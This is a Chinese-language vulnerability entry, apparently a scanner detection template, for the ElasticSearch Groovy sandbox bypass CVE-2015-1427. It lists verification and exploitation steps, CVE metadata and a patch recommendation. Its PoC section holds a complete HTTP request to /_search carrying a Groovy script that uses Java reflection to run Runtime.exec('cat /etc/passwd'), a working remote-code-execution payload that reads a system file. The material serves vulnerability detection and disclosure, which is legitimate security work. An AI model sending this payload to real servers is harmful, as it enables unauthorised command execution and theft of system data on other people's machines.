验证漏洞存在方法
    - 发送包含Groovy脚本的POST请求到/_search端点
    - 检查响应中是否包含/etc/passwd文件内容
    - 验证响应状态码是否为200且包含application/json头部

漏洞利用方法
    - 通过ElasticSearch的Groovy脚本引擎绕过沙箱保护机制
    - 利用Java反射机制调用Runtime.getRuntime().exec()执行任意系统命令
    - 使用java.lang.Math.class.forName()加载java.lang.Runtime类
    - 执行cat /etc/passwd命令读取系统文件内容

PoC:
```http
POST /website/blog/ HTTP/1.1
Host: {{Hostname}}
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded

{
  "name": "test"
}

POST /_search HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded

{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getText()"}}}
```

匹配条件:
- 响应头部包含: application/json
- 响应体包含: root:.*:0:0: (正则表达式匹配/etc/passwd中的root用户行)
- 响应状态码: 200

漏洞信息:
- 漏洞名称: ElasticSearch - Remote Code Execution
- CVE ID: CVE-2015-1427
- CVSS评分: 7.5 (高危)
- 影响版本: ElasticSearch before 1.3.8 and 1.4.x before 1.4.3
- 漏洞描述: ElasticSearch的Groovy脚本引擎存在沙箱绕过漏洞，允许远程攻击者执行任意shell命令
- 影响: 成功利用此漏洞可允许攻击者在受影响系统上执行任意代码
- 修复建议: 应用ElasticSearch提供的最新安全补丁和更新
